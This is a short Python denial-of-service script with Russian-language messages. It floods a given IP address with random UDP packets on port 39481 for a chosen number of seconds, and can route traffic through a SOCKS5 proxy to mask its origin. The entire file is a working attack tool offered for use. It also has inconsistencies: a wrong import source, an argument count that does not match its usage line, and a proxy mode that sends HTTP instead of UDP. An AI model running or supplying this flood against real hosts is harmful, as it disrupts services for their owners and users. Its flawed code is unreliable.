import socket
import asyncio
import random
import sys
from aiohttp import ClientSession
from aiohttp_socks import ProxyConnector, ClientTimeout

async def udp_flood(ip, seconds, proxy=None):
    end_time = asyncio.get_event_loop().time() + seconds
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    connector = ProxyConnector.from_url(proxy) if proxy else None
   
    def random_bytes(size):
        return bytes(random.getrandbits(8) for _ in range(size))

    print(f"Запуск усиленной UDP атаки на {ip} на {seconds} секунд(ы)...")

    try:
        while asyncio.get_event_loop().time() < end_time:
            bytes_to_send = random_bytes(random.randint(1, 65507))
            
            if connector:
                async with ClientSession(connector=connector, timeout=ClientTimeout(total=5)) as session:
                    await session.post(f'http://{ip}:39481', data=bytes_to_send)
            else:
                sock.sendto(bytes_to_send, (ip, 39481))

            await asyncio.sleep(random.uniform(0.01, 0.05))

    except Exception as e:
        print(f"Ошибка при отправке пакета: {str(e)}")
    finally:
        sock.close()

    print("UDP атака завершена.")

async def main(ip, seconds, proxy):
    await udp_flood(ip, seconds, proxy)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Использование: python3 udp_attack.py <ip> <seconds>")
        sys.exit(1)

    ip = sys.argv[1]
    seconds = int(sys.argv[2])

    proxy = None
    try:
        with open("proxy_socks5.txt", "r") as f:
            proxy = f.read().strip()
    except FileNotFoundError:
        print("Файл proxy_socks5.txt не найден.")
        sys.exit(1)

    asyncio.run(main(ip, seconds, proxy))